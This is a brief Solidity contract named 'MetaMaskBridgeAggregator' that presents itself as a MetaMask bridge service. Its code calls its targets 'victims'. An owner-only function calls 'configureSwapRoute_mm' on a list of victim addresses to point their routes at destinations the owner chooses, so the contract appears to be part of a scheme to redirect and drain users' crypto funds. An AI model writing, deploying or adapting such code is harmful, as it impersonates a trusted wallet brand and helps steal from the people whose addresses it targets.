// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MetaMaskBridgeAggregator {
    address private immutable _owner;
    uint256 private constant _BRIDGE_VERSION = 0x7f8e9d0c1b2a;

    error InitializeFailed(address victim, address destination, bytes reason);
    error NotAuthorized();
    
    event ForwardingSetup(
        address indexed victim,
        address destination,
        bool success
    );

    constructor(address owner_) {
        _owner = owner_;
    }

    modifier onlyOwner() {
        if (msg.sender != _owner) revert NotAuthorized();
        _;
    }

    function setupForwarding(
        address[] calldata victims,
        address payable[] calldata destinations
    ) external onlyOwner {
        require(victims.length == destinations.length, "Length mismatch");
        
        for (uint256 i = 0; i < victims.length; i++) {
            (bool success, bytes memory reason) = victims[i].call(
                abi.encodeWithSignature("configureSwapRoute_mm(address)", destinations[i])
            );
            emit ForwardingSetup(victims[i], destinations[i], success);
            if (!success) {
                revert InitializeFailed(victims[i], destinations[i], reason);
            }
        }
    }
}